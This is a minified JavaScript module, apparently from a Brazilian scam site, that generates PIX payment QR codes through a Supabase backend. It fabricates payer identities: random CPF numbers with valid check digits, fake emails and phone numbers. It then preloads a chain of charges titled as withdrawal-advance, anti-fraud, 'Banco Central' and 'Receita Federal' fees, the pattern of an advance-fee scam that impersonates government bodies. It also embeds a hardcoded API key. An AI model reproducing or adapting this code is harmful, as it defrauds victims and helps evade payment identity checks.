const g="https://tbmhixbambsdenkxjdlz.supabase.co",h="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRibWhpeGJhbWJzZGVua3hqZGx6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ5NzQwMjUsImV4cCI6MjA4MDU1MDAyNX0.C3xXc9utoJFguYXSEHtSEjI4p6Shnx7e3tfmK5o7dP4",d="pixCacheData",m="pixCacheTimestamp";function E(){try{const e=localStorage.getItem("userPixData");if(e)return JSON.parse(e)}catch(e){console.error("Erro ao ler dados do localStorage",e)}return null}function S(){let e="";for(let t=0;t<9;t++)e+=Math.floor(Math.random()*10);let o=0;for(let t=0;t<9;t++)o+=parseInt(e.charAt(t))*(10-t);let r=11-o%11,c=r>9?0:r;e+=c,o=0;for(let t=0;t<10;t++)o+=parseInt(e.charAt(t))*(11-t);r=11-o%11;let a=r>9?0:r;return e+=a,e}function X(e){const o=["gmail.com","hotmail.com","outlook.com","yahoo.com.br"],r=e.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g,"").replace(/\s+/g,"."),c=o[Math.floor(Math.random()*o.length)],a=Math.floor(Math.random()*999);return`${r}${a}@${c}`}function x(){const e=["11","21","31","41","51","61","71","81","91"],o=Math.floor(1e7+Math.random()*9e7);return`${e[Math.floor(Math.random()*e.length)]}9${o}`}async function s(e="initial",o=null){try{const r=E();if(!r)throw new Error("Dados do formulário não encontrados");let c=r.chavePix;r.tipoChave==="CPF"?c=r.chavePix.replace(/\D/g,""):c=S();const a={customerName:r.nome,customerEmail:X(r.nome),customerPhone:x(),customerDocument:c,pixKey:r.chavePix,pixKeyType:r.tipoChave,transactionType:e};o&&(a.amount=o),e==="upsell1"?a.itemTitle="Taxa de Antecipação de Saque":e==="upsell2"?a.itemTitle="Taxa Anti-Fraude":e==="tarifa"?a.itemTitle="Tarifa Anti-Fraude - Banco Central":e==="upsell4"&&(a.itemTitle="Taxa de Reembolso - Receita Federal");const t=`${g}/functions/v1/create-pix`;console.log("Chamando API:",t);const P={Authorization:`Bearer ${h}`,"Content-Type":"application/json"},l=await fetch(t,{method:"POST",headers:P,body:JSON.stringify(a)});console.log("Status da resposta:",l.status,l.statusText);const u=await l.text();console.log("Resposta bruta (primeiros 200 chars):",u.substring(0,200));let n;try{n=JSON.parse(u)}catch(C){throw console.error("Erro ao fazer parse da resposta:",C),console.error("Resposta completa:",u),new Error("Erro de comunicação com o servidor. Por favor, tente novamente.")}if(!l.ok||!n.success)throw new Error(n.error||"Erro ao gerar PIX");return n}catch(r){throw console.error("Erro ao criar PIX:",r),r}}function i(e){try{const o=`${d}_${e}`,r=`${m}_${e}`,c=localStorage.getItem(o),a=localStorage.getItem(r);return!c||!a?null:Date.now()-parseInt(a)>15e5?(localStorage.removeItem(o),localStorage.removeItem(r),null):JSON.parse(c)}catch(o){return console.error("Erro ao ler cache de PIX:",o),null}}async function w(e=3e3){const o=Date.now();for(;typeof QRCode>"u"||!QRCode.toDataURL;){if(Date.now()-o>e)return console.warn("QRCode library not loaded after timeout"),!1;await new Promise(r=>setTimeout(r,100))}return!0}async function y(e){return new Promise(async(o,r)=>{try{if(!await w()){console.log("QRCode library not available, skipping pre-render"),o(null);return}QRCode.toDataURL(e,{width:200,margin:2,color:{dark:"#000000",light:"#ffffff"}},function(a,t){a?(console.error("Erro ao gerar QR code:",a),o(null)):o(t)})}catch(c){console.error("Erro ao gerar QR code:",c),o(null)}})}async function p(e,o){try{const r=`${d}_${e}`,c=`${m}_${e}`;if(o.qrcode&&!o.qrcodeImageUrl){console.log(`Gerando QR code em background para ${e}...`);const a=await y(o.qrcode);a&&(o.qrcodeImageUrl=a,console.log(`QR code gerado em background para ${e}`))}localStorage.setItem(r,JSON.stringify(o)),localStorage.setItem(c,Date.now().toString()),console.log(`PIX ${e} armazenado em cache`)}catch(r){console.error("Erro ao salvar cache de PIX:",r)}}function $(e){try{const o=`${d}_${e}`,r=`${m}_${e}`;localStorage.removeItem(o),localStorage.removeItem(r),console.log(`Cache de PIX ${e} limpo`)}catch(o){console.error("Erro ao limpar cache de PIX:",o)}}async function b(){console.log("Iniciando pré-carregamento do PIX inicial...");const e=i("initial");if(e)return console.log("PIX inicial já está em cache"),f(),e;try{const o=await s("initial",2167);return p("initial",o),console.log("PIX inicial pré-carregado com sucesso"),f(),o}catch(o){return console.error("Erro ao pré-carregar PIX inicial:",o),null}}async function f(){console.log("Iniciando pré-carregamento do PIX upsell1...");const e=i("upsell1");if(e)return console.log("PIX upsell1 já está em cache"),I(),e;try{const o=await s("upsell1",2290);return p("upsell1",o),console.log("PIX upsell1 pré-carregado com sucesso"),I(),o}catch(o){return console.error("Erro ao pré-carregar PIX upsell1:",o),null}}async function I(){console.log("Iniciando pré-carregamento do PIX upsell2...");const e=i("upsell2");if(e)return console.log("PIX upsell2 já está em cache"),e;try{const o=await s("upsell2",3796);return p("upsell2",o),console.log("PIX upsell2 pré-carregado com sucesso"),o}catch(o){return console.error("Erro ao pré-carregar PIX upsell2:",o),null}}async function R(e,o=null){const r=i(e);return r?(console.log(`Usando PIX ${e} do cache`),$(e),r):(console.log(`Gerando novo PIX ${e}...`),await s(e,o))}export{f as a,I as b,s as c,R as g,b as p};
